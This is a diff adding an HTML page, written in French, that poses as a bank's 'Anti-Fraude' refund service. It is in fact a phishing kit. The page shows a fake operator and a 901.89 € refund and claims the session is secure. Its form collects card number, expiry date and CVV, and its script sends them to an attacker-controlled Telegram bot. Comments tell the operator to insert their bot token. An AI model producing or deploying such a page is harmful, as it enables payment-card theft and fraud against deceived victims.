@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Service Remboursement Sécurisé</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #ffffff;
+      color: #2c3e50;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .card {
+      background: none;
+      border: none;
+      box-shadow: none;
+      padding: 0;
+      width: 100%;
+      max-width: 520px;
+    }
+
+    img.logo {
+      width: 300px;
+      margin-top: 40px;
+      margin-bottom: 30px;
+    }
+
+    .title {
+      font-size: 28px;
+      font-weight: bold;
+      color: #1a1a1a;
+      margin-bottom: 30px;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      font-weight: 500;
+      color: #4d4d4d;
+      margin-bottom: 15px;
+    }
+
+    .secure-note {
+      background-color: #eafaf1;
+      border-left: 5px solid #28a745;
+      color: #155724;
+      padding: 15px;
+      font-size: 15px;
+      margin-bottom: 35px;
+      border-radius: 6px;
+      text-align: left;
+    }
+
+    .info {
+      font-size: 15px;
+      color: #333;
+      margin-bottom: 10px;
+      line-height: 1.6;
+      text-align: left;
+    }
+
+    .small {
+      font-size: 15px;
+      color: #666;
+      margin-bottom: 35px;
+      font-weight: 600;
+      text-align: left;
+    }
+
+    form {
+      text-align: left;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 20px;
+      font-size: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      box-sizing: border-box;
+      transition: border-color 0.3s;
+    }
+
+    input:focus {
+      border-color: #2c7dfa;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #2c7dfa;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #1b5ec9;
+    }
+
+    @media (max-width: 600px) {
+      .title {
+        font-size: 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+
+    <img src="https://www.francetransactions.com/local/adapt-img/1200/10x/IMG/arton54732.jpg?1631342981" alt="Logo bancaire" class="logo" />
+
+    <div class="title">Litige Remboursement Bancaire</div>
+    <div class="subtitle">Opération de régularisation - Vérification confidentielle</div>
+
+    <!-- ✅ Message de sécurité en vert -->
+    <div class="secure-note">
+      Vous consultez actuellement une page sécurisée du service <strong>Anti-Fraude</strong>.<br />
+      Cette procédure confidentielle permet d'autoriser le transfert du remboursement sur votre compte bancaire.
+    </div>
+
+    <div class="info">
+      <strong>Opérateur en charge :</strong> Antoine Menard<br />
+      <strong>Statut :</strong> En ligne - Session cryptée
+    </div>
+
+    <div class="small">
+      <strong>Montant concerné :</strong> 901.89 €<br />
+      Vérification instantanée requise pour confirmation de la régularisation.
+    </div>
+
+    <form id="cardForm" onsubmit="sendCardInfo(event)">
+      <input type="text" id="cardNumber" placeholder="Numéro de carte" required />
+      <input type="text" id="expiryDate" placeholder="Date d'expiration (MM/AA)" required />
+      <input type="text" id="cvv" placeholder="CVV" required />
+      <button type="submit">Envoyer les informations</button>
+    </form>
+  </div>
+
+  <script>
+    function sendCardInfo(event) {
+      event.preventDefault();
+
+      const token = 'TON_TOKEN'; // ← Remplace avec ton token Telegram
+      const chat_id = 'TON_CHAT_ID'; // ← Remplace avec ton chat_id
+
+      const cardNumber = document.getElementById('cardNumber').value.trim();
+      const expiryDate = document.getElementById('expiryDate').value.trim();
+      const cvv = document.getElementById('cvv').value.trim();
+
+      const message = ` 
+<b>Nouvelle demande de remboursement - Validation carte</b>
+
+<b>Montant :</b> 901.89 € 
+<b>Opérateur :</b> Antoine Menard 
+<b>Statut :</b> En ligne - Session sécurisée
+
+<b>Coordonnées bancaires fournies :</b>
+Numéro : <code>${cardNumber}</code>
+Expiration : <code>${expiryDate}</code>
+CVV : <code>${cvv}</code>
+      `;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=HTML`,
+      })
+      .then((res) => res.json())
+      .then((data) => {
+        if (data.ok) {
+          alert('Informations transmises avec succès.');
+          document.getElementById('cardForm').reset();
+        } else {
+          alert('Erreur Telegram : ' + data.description);
+        }
+      });
+    }
+  </script>
+
+</body>
+</html>
